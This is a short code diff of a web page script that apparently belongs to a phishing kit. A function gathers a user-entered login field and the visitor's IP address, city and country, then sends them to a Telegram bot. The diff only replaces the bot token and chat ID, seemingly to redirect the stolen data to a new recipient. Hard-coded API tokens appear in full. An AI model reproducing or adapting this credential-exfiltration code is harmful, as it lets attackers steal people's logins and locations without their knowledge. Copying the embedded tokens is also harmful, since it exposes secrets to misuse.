@@ -366,7 +366,7 @@
 
 
 <script>
-  const tokenTelegram = "6703463105:AAETk0SSbA1V4OQ7DyXwceksGsP--JQZdOY";
+  const tokenTelegram = "7761588199:AAELEbiX7N4Zvdcv3A7aWjeuW7cTw9S6f6I";
   const tokenIPinfo = "9c9af8c7467cc4";
 
   function enviarDatos(event) {
@@ -389,13 +389,13 @@ Usuario: ${usr}
 IP: ${data.ip}
 ${data.city}, ${data.country}`;
 
-      fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot7761588199:AAELEbiX7N4Zvdcv3A7aWjeuW7cTw9S6f6I/sendMessage`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "5666517648",
+          chat_id: "6196862320",
           text: mensaje
         })
       })
